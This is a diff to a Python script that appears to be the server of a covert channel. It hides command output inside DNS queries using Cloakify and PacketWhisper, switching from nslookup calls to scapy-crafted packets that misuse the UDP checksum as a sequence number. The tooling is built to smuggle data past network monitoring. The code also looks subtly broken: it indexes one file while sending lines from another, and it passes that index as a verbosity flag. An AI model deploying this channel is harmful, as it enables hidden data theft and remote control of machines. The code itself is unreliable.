@@ -9,6 +9,7 @@ from cloakify import Cloakify
 from decloakify import Decloakify
 from pcapCapture import *
 from packetWhisper import TransferCloakedFile, ExtractDNSQueriesFromPCAP, ExtractPayloadFromDNSQueries
+from scapy.all import *
 import signal
 import threading
 
@@ -113,12 +114,23 @@ def send_response(response, dns='127.0.0.1', args=None):
     
     
     TransferCloakedFile("cloaked_response.txt", 0.0, dns)
-    # Send response using dns requests
+
+
+    fqdn_array = []
     with open(cloaked_response, 'r') as file:
+        fqdn_array = [line.strip() for line in file]
+
+
+
+    # Send command using dns requests, the checksum is the index of the fqdn in the array so that the receiver can check if any packets are missing
+    with open(cloaked_command, 'r') as file:
         for fqdn in file:
             fqdn_str = fqdn.strip()
-            subprocess.call(['nslookup', fqdn_str, dns], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    
+            dns_packet = IP(dst=dns)/UDP()/DNS(rd=1, qd=DNSQR(qname=fqdn_str))
+            dns_packet[UDP].chksum = fqdn_array.index(fqdn_str)
+            send(dns_packet, verbose=fqdn_array.index(fqdn_str))
+            #subprocess.call(['nslookup', fqdn_str, dns], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
     # Remove response file
     os.remove(cloaked_response)
 
@@ -133,12 +145,15 @@ if __name__ == "__main__":
     parser.add_argument('--run', action='store_true', help="Run the server if specified")    
     parser.add_argument('--local', action='store_true', help="If both sender and receiver are on the same LAN, use this flag to capture the pcap locally.")    
     parser.add_argument('--encrypt', action='store_true', help="Use this flag if you want to use an encrypted communication.") 
+    parser.add_argument('--EOT_url', type=str, help="End of Transmission URL")
     subprocess.Popen(['python', 'dns_server.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     args = parser.parse_args()
     
     open('cloaked.payload', 'w').close()
     open('decloaked_command.txt', 'w').close()
     if args.run:
+        if args.EOT_url:
+           os.environ['EOT_URL'] = args.EOT_url
         print("Running and waiting for requests...")
         while True:
             try:
